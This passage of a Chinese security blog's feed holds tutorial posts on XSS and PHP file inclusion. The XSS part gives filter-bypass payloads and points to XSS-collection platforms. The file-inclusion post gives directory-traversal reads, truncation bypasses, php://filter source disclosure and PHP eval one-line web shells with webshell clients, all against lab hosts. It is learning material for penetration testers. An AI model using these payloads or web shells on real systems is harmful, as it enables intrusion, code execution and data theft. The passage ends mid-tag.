&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里过滤掉了script标签，可以尝试使用其他标签通过事件来弹窗，但是也过滤了空格。</p><p>可以使用如下符号替代空格</p><table><thead><tr><th>符号</th><th>URL编码</th></tr></thead><tbody><tr><td>回车(CR)</td><td>%0d</td></tr><tr><td>换行(LF)</td><td>%0a</td></tr><tr><td>？？？求补充</td><td>%0c</td></tr></tbody></table><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?keyword=&lt;img%0asrc=x%0aonerror=alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure><h1 id="XSS-实战应用"><a href="#XSS-实战应用" class="headerlink" title="XSS 实战应用"></a>XSS 实战应用</h1><h2 id="XSS-平台搭建"><a href="#XSS-平台搭建" class="headerlink" title="XSS 平台搭建"></a>XSS 平台搭建</h2><p>推荐一个经典开源的 XSS 平台：</p><p><strong>项目地址</strong>：<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p><strong>Fork 地址</strong>：<a href="https://github.com/winthorlimo/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/winthorlimo/BlueLotus_XSSReceiver</a></p><p>无需数据库，将源码放入到网站目录下访问即可，配置记录好平台的后台登录密码：</p><p><img src="http://qiniuyun.lintstar.top/image-20200803134636686.png" alt="image-20200803134636686"></p><p>以后再次登录手动访问 login.php 即可重新登录</p><p>后台地址：<a href="http://127.0.0.1/xss/login.php" target="_blank" rel="noopener">http://127.0.0.1/xss/login.php</a></p><p>此时别人访问 <a href="http://127.0.0.1/xss/" target="_blank" rel="noopener">http://127.0.0.1/xss/</a> 也会被钓鱼记录。</p><h2 id="第三方XSS平台"><a href="#第三方XSS平台" class="headerlink" title="第三方XSS平台"></a>第三方XSS平台</h2><p><a href="https://xss8.cc/xss.php" target="_blank" rel="noopener">https://xss8.cc/xss.php</a></p><p><a href="https://xss.pt/xss.php" target="_blank" rel="noopener">https://xss.pt/xss.php</a></p><h2 id="奇技淫巧"><a href="#奇技淫巧" class="headerlink" title="奇技淫巧"></a>奇技淫巧</h2><blockquote><p>百度百科：<strong>奇技淫巧</strong>，读音qí jì yín qiǎo，是一个成语，意思是指过于奇巧，让人着迷，却又无益的技艺与制品。奇：奇异，奇巧，有趣的。技：技术，技巧，带有技术性的。淫：过分，极端，沉迷，上瘾。</p></blockquote><h3 id="反引号代替圆括号"><a href="#反引号代替圆括号" class="headerlink" title="反引号代替圆括号"></a>反引号代替圆括号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert`1`&gt;</span><br></pre></td></tr></table></figure><h3 id="location-拆分"><a href="#location-拆分" class="headerlink" title="location + 拆分"></a>location + 拆分</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=location=<span class="string">"javascript:alert(1)"</span>&gt;</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=location=<span class="string">"javascript:alert%281%29"</span>&gt;  <span class="comment">// URL 编码</span></span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=location=<span class="string">"javascript:"</span>+<span class="string">"aler"</span>+<span class="string">"t(1)"</span>&gt; <span class="comment">// 也可以拆分</span></span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=location=<span class="string">"javascript:"</span>+<span class="string">"aler"</span>+<span class="string">"t%281%29"</span>&gt;  <span class="comment">// URL编码+拆分</span></span><br></pre></td></tr></table></figure><h3 id="svg-top"><a href="#svg-top" class="headerlink" title="svg + top"></a>svg + top</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=top[<span class="string">'alert'</span>](<span class="number">1</span>)&gt;</span><br><span class="line">&lt;svg onload=top[<span class="string">'al'</span>+<span class="string">'ert'</span>](<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><h3 id="detail-top"><a href="#detail-top" class="headerlink" title="detail + top"></a>detail + top</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=alert(<span class="number">1</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br><span class="line">&lt;details ontoggle=top[<span class="string">"alert"</span>](<span class="number">1</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br><span class="line">&lt;details open ontoggle=top[<span class="string">"alert"</span>](<span class="number">1</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">details</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>HTML <code>&lt;details&gt;</code>元素</strong>可创建一个挂件，仅在被切换成展开状态时，它才会显示内含的信息</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XSS跨站脚本攻击&quot;&gt;&lt;a href=&quot;#XSS跨站脚本攻击&quot; class=&quot;headerlink&quot; title=&quot;XSS跨站脚本攻击&quot;&gt;&lt;/a&gt;XSS跨站脚本攻击&lt;/h1&gt;&lt;h2 id=&quot;XSS简介&quot;&gt;&lt;a href=&quot;#XSS简介&quot; class=&quot;header
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined05/4089de4e.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined05/4089de4e.html</id>
    <published>2020-08-05T14:00:00.000Z</published>
    <updated>2020-08-20T09:26:45.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><p>下面是两个看上去比较啰嗦的 php 文件，运行的效果几乎是一致的：</p><p><strong>one.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">welcome</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"welcome to &#123;$name&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">welcome(<span class="string">'UserA'</span>);</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200809113430.png" alt="20200809113430"></p><p><strong>two.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">welcome</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"welcome to &#123;$name&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">welcome(<span class="string">'UserB'</span>);</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200809113551.png" alt="20200809113551"></p><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用 此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。下面来改进上述的功能代码：</p><p><strong>common.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">welcome</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"welcome to &#123;$name&#125;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>one.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">'common.php'</span>);</span><br><span class="line">welcome(<span class="string">'UserA'</span>);</span><br></pre></td></tr></table></figure><p><strong>two.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">'common.php'</span>);</span><br><span class="line">welcome(<span class="string">'UserB'</span>);</span><br></pre></td></tr></table></figure><p>开发者希望代码更加灵活，所以很多时候会将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活，导致客户端可能调用恶意文件，造成文件包含漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure><p>几乎在所有的脚本语言中都会提供文件包含的功能，但文件包含漏洞在 PHP 中居多，而在 JSP、ASP、ASP.NET 程序中却非常少，甚至没有包含漏洞的存在。 这与程序开发人员的水平无关，而问题在于语言设计的弊端。</p><p>文件包含漏洞产生的原因是在引入文件时，由于传入的文件名没有经过合理的校验或者校验被绕过，从而操作了预想之外的文件，因此导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时，就会形成本地文件包含漏洞。</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>文件包含（File Inclusion）可能会出现在JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下。</p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(), <span class="keyword">include_once</span>(), <span class="keyword">require</span>(), <span class="keyword">require_once</span>(), fopen(), readfile()</span><br></pre></td></tr></table></figure><p>在互联网的安全历史中，PHP的文件包含漏洞已经臭名昭著了，因为黑客们在各种各样的PHP应用中挖出了数不胜数的文件包含漏洞，且后果都非常严重。</p><p>文件包含是PHP的一种常见用法，这四个函数都可以进行文件包含，但作用却不一样，其区别如下:</p><ul><li><strong>require</strong> 找不到被包含的文件时会产生致命错误(E_COMPILE_ERROR)，并停止脚本;</li><li><strong>include</strong> 找不到被包含的文件时只会产生警告(E_WARNING)，脚本将继续执行;</li><li><strong>include_once</strong>:此语句和 include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含，以避免函数重定义，变量重新赋值等问题;</li><li><strong>require_once</strong>:此行语句和 require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含，以避免函数重定义，变量重新赋值等问题。</li></ul><p>使用这 4 种函数包含一个新的文件时，只要<strong>文件内容符合 PHP 语法规范</strong>，任何扩展名都可以被 PHP 解析。当包含非 PHP 语法规范的源文件时，将会暴露其源代码，<strong>造成文件读取漏洞</strong>。</p><p>要想成功利用文件包含漏洞，需要满足下面两个条件：</p><ol><li>include() 等函数通过动态变量的方式引入需要包含的文件</li><li>攻击者能够控制该动态变量</li></ol><p>PHP的文件包含漏洞分为两大种：<strong>本地文件包含</strong> (Local File Include)和 <strong>远程文件包含</strong>(Remote File Include)</p><p>两种包含漏洞的检测方法和防御方法各不相同，</p><p><strong>本地文件包含漏洞</strong>是加载服务器本地的文件</p><p><strong>远程文件包含漏洞</strong>是加载一个远程的资源</p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><p>JSP 包含分两种方式:静态包含和动态包含。</p><p><strong>1.静态包含</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include file=<span class="string">"page.txt"</span>%&gt;</span><br></pre></td></tr></table></figure><p>为 JSP 中的静态包含语句，静态包含语句先进行包含，再做处理操作。下面看一段简单的代码来观察 JSP 静态包含的特性。</p><p><code>a.txt</code> 文件内容如下:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span> pageEncoding=<span class="string">"gbk"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.println(<span class="string">"this is page a.txt"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>尝试用 <code>index.jsp</code> 来包含 <code>a.txt</code>，代码如下:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include file=<span class="string">"a.txt"</span> %&gt;</span><br></pre></td></tr></table></figure><p>用浏览器访问 index.jsp，此时 a.txt 文件会被当作 JSP 文件解析：</p><p><img src="http://qiniuyun.lintstar.top/20200809113905.png" alt="20200809113905"></p><p>在前面曾经说过，文件包含漏洞利用最主要的是可以控制被包含的文件，</p><p>但是 JSP 语法规定，include 指令为静态包含，只允许包含一个已经存在于服务器中的文件，而不能使用变量来控制包含某个文件。这就意味着使用 include 指令将不存在文件包含漏洞。</p><p><strong>2.动态包含</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">"page.txt"</span> /&gt;</span><br></pre></td></tr></table></figure><p>为动态包含语句。动态包含与静态包含恰恰相反，在运行时， 首先会处理被包含页面，然后再包含，而且可以包含一个动态页面(变量)。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String pages = request.getParameter(<span class="string">"page"</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;jsp:include page="&lt;%=pages%&gt;" &gt;&lt;/jsp:include&gt;</span><br></pre></td></tr></table></figure><p>尝试通过 <code>pages</code> 参数来再次包含 a.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a.jsp?page=a.txt</span><br></pre></td></tr></table></figure><p>当<code>&lt;jsp:include/&gt;</code>标签在包含一个非 JSP 文件扩展名时，即使其内容符合 JSP 语 法规范，也会读取其源代码，而<strong>不会解析</strong>其 JSP 代码：</p><p><img src="http://qiniuyun.lintstar.top/20200809113942.png" alt="20200809113942"></p><p>那么此时新建一个文件：</p><p><strong>b.jsp</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span> pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    out.println(<span class="string">"this is page b.jsp"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>那么来尝试包含 b.jsp 试试看：</p><p><img src="http://qiniuyun.lintstar.top/20200809114010.png" alt="20200809114010"></p><p>这就意味着 JSP 所包含的页面即使被攻击者控制，攻击者得到的信息也是有限的。(攻击者一般都会包含一些 Web 容器的配置文件， 比如 Tomcat 的 user.xml。来获取敏感信息)</p><p>由于语言设计的差异，相对来说，JSP 比 PHP 拥有更高的安全性。PHP 从某些方面而言，它的许多优点正是它的缺点。</p><h1 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞(Local File Inclusion，简称 LFI)。</p><p>大多出现在模块加载、模板加载和cache调用这些地方，渗透的时候利用起来并不鸡肋，本地文件包含有多种利用方式，比如上传一个允许上传的文件格式的文件再包含来执行代码，包含 PHP 上传的临时文件，在请求 URL 或者 UA 里面加入要执行的代码，WebServer 记录到日志后再包含WebServer的日志。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>引入同目录下的一个文件时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=payload.txt</span><br></pre></td></tr></table></figure><p>当 payload.txt 的内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问漏洞的 URL，会发现<code>phpinfo()</code>函数代码执行了，这个页面被当作 PHP 来解析了。</p><p><img src="http://qiniuyun.lintstar.top/image-20200511080523405.png" alt="image-20200511080523405"></p><p>也可以传入自定义的路径信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../windows/win.ini</span><br><span class="line"></span><br><span class="line">?file=C:\Windows\win.ini</span><br></pre></td></tr></table></figure><blockquote><p>../ 越多越好，宁缺毋滥</p></blockquote><h1 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>PHP 不仅可以对本地文件进行包含，还可以对远程文件进行包含(Remote File Inclusion，简称 RFI)。</p><p>如果要使用远程包含功能，首先需要确定 PHP 是否已经开启远程包含功能选项(PHP 默认关闭远程包含功能)。开启 远程包含功能需要在 php.ini 配置文件中修改，修改后需要重启 Web 容器服务使其生效，选项如下:</p><ul><li>allow_url_fopen</li><li>allow_url_include (PHP 5.2 之后默认为 Off)</li></ul><p>这样之前演示的本地问价包含，这里将路径改为 URL 的形式去包含看看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.89/<span class="keyword">fi</span>/index.php?file=http://192.168.31.89/<span class="keyword">fi</span>/payload.txt</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200511081532168.png" alt="image-20200511081532168"></p><p>远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循 PHP 语法规范，PHP 解析器，就会对其解析。</p><p>尝试包含 其他远程文件测试看看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.89/<span class="keyword">fi</span>/index.php?file=http://www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200809114242.png" alt="20200809114242"></p><h1 id="一句话工作原理"><a href="#一句话工作原理" class="headerlink" title="一句话工作原理"></a>一句话工作原理</h1><h2 id="GET-型"><a href="#GET-型" class="headerlink" title="GET 型"></a>GET 型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">shell.php?pass=phpinfo();</span><br><span class="line">shell.php?pass=system(<span class="string">'dir'</span>);</span><br><span class="line">shell.php?pass=system(<span class="string">'ipconfig'</span>);</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200511082428456.png" alt="image-20200511082428456"></p><h2 id="POST-型"><a href="#POST-型" class="headerlink" title="POST 型"></a>POST 型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和 GET 型类似，只是传参的方式变了：</p><p><img src="http://qiniuyun.lintstar.top/image-20200511082653270.png" alt="image-20200511082653270"></p><h2 id="REQUEST-型"><a href="#REQUEST-型" class="headerlink" title="REQUEST 型"></a>REQUEST 型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以接受URL和表单传参</p></blockquote><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h3><p><strong>项目地址</strong>：<a href="https://github.com/AntSwordProject/antSword" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword</a></p><p><strong>文档详情</strong>：<a href="https://doc.u0u.us/zh-hans/" target="_blank" rel="noopener">https://doc.u0u.us/zh-hans/</a></p><p>中国蚁剑可以设置 Burpsuite 的代理，这样可以很方便地查看中国蚁剑的实际的流量情况，可以加深对一句话木马的理解以及后面进阶的 Bypass 操作：</p><p><img src="http://qiniuyun.lintstar.top/image-20200713213032665.png" alt="image-20200713213032665"></p><h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p><strong>项目地址</strong>：<a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></p><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>经典的管理工具，但是由于可能存在后门的可能，不建议大家使用中国菜刀。</p><p><strong>网友项目地址</strong>：<a href="https://github.com/raddyfiy/caidao-official-version" target="_blank" rel="noopener">https://github.com/raddyfiy/caidao-official-version</a></p><h1 id="文件包含之截断"><a href="#文件包含之截断" class="headerlink" title="文件包含之截断"></a>文件包含之截断</h1><h2 id="防护措施"><a href="#防护措施" class="headerlink" title="防护措施"></a>防护措施</h2><p>大多数程序猿认为 PHP 中的包含漏洞比较好修复，固定扩展名即可，代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">      error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span> $_GET[<span class="string">'file'</span>] .<span class="string">".php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当进行包含时，不需要传输文件扩展名，例如，想要包含 News.php 页面，只需要传入</p><p><code>?file=News</code> 即可。这样可以变相地修复包含漏洞。</p><h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><p>尝试之前的 Payload 进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../windows/win.ini</span><br></pre></td></tr></table></figure><p>并没成功读取到问价内容，这个时候关掉 PHP的 忽略BUG的代码，尝试看下到底发生了什么：</p><p><img src="http://qiniuyun.lintstar.top/image-20200511091241613.png" alt="image-20200511091241613"></p><p>这个导致我们无法随心所欲地去读取系统文件信息了，因为这个文件显然是不存在的，这个时候程序猿就会想到使用字符串截断的方法来进行绕过。</p><h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><strong>%00截断</strong></h2><p><strong>截断的原理</strong>：PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节(\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=payload.txt\0</span><br></pre></td></tr></table></figure><p>因为浏览器 URL 并不支持 <code>\</code>，因此通过浏览访问的时候需要通过 urlencode 进行编码，变成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=payload.txt%00</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200511093717005.png" alt="image-20200511093717005"></p><p>这种方法只适用于</p><ul><li>magic_quotes_gpc = Off</li><li>PHP 版本小于 5.3.4</li></ul><p>如果为 On %00(NULL)将会被转义，从而无法正常截断。</p><p>magic_quotes_gpc 为 On 的情况会为以下预定义字符转义:</p><ul><li>单引号(‘)</li><li>双引号(“)</li><li>反斜杠()</li><li>NULL</li></ul><h2 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a><strong>路径长度截断</strong></h2><p><strong>条件</strong>：PHP 的老版本（PHP &lt;=5.3.4）、Windows 或 Linux</p><p>Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。<code>./</code>表示当前路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=payload.txt././././././././超过一定数量的./././././</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200511093800926.png" alt="image-20200511093800926"></p><h2 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a><strong>点号截断</strong></h2><p><strong>条件</strong>：PHP 的老版本（PHP &lt;=5.3.4），Windows</p><p>Winodws 下目录最大长度为 256 字节，Windows 下<code>cd ...</code>显示的还是当前目录（点的数量不等于2时）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=payload.txt........超过一定数量的........</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/image-20200511094340396.png" alt="image-20200511094340396"></p><h2 id="远程文件截断"><a href="#远程文件截断" class="headerlink" title="远程文件截断"></a>远程文件截断</h2><blockquote><p><code>robot.txt</code> 禁止爬虫日志:可以看到网站隐藏的一些目录</p></blockquote><p><img src="http://qiniuyun.lintstar.top/20200803160039.png" alt="20200803160039"></p><p>可以通过空格、井号、问号截断绕过，不受GPC和PHP版本限制，只要能返回代码给包含函数，它就能执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 空格截断</span></span><br><span class="line">?file=http://192.168.31.89/<span class="keyword">fi</span>/payload.txt%20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 问号截断</span></span><br><span class="line">?file=http://192.168.31.89/<span class="keyword">fi</span>/payload.txt?</span><br><span class="line"></span><br><span class="line"><span class="comment"># 井号截断</span></span><br><span class="line">?file=http://192.168.31.89/<span class="keyword">fi</span>/payload.txt%23</span><br></pre></td></tr></table></figure><h1 id="PHP-伪协议"><a href="#PHP-伪协议" class="headerlink" title="PHP 伪协议"></a>PHP 伪协议</h1><p>PHP 带有很多内置 URL 风格的封装协议，这类协议与 fopen()、copy()、file_exists()、filesize() 等文件系统函数所提供的功能类似。</p><table><thead><tr><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>file://</td><td>访问本地文件系统</td></tr><tr><td>http://</td><td>访问 HTTP(s)网址</td></tr><tr><td>ftp://</td><td>访问 FTP(s) URLs</td></tr><tr><td>php://</td><td>访问输入/输出流(I/O streams)</td></tr><tr><td>zlib://</td><td>压缩流</td></tr><tr><td>data://</td><td>数据(RFC 2397)</td></tr><tr><td>ssh2://</td><td>Secure Shell 2</td></tr><tr><td>expect://</td><td>处理交互式的流</td></tr><tr><td>glob://</td><td>查找匹配的文件路径</td></tr></tbody></table><blockquote><p>利用php伪协议进行远程文件包含：</p></blockquote><p><img src="http://qiniuyun.lintstar.top/20200803161342.png" alt="20200803161342"></p><p>访问URL：<code>http://10.11.29.138/fi/php.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p><img src="http://qiniuyun.lintstar.top/20200803161318.png" alt="20200803161318"></p><blockquote><p><code>php.php</code> :</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 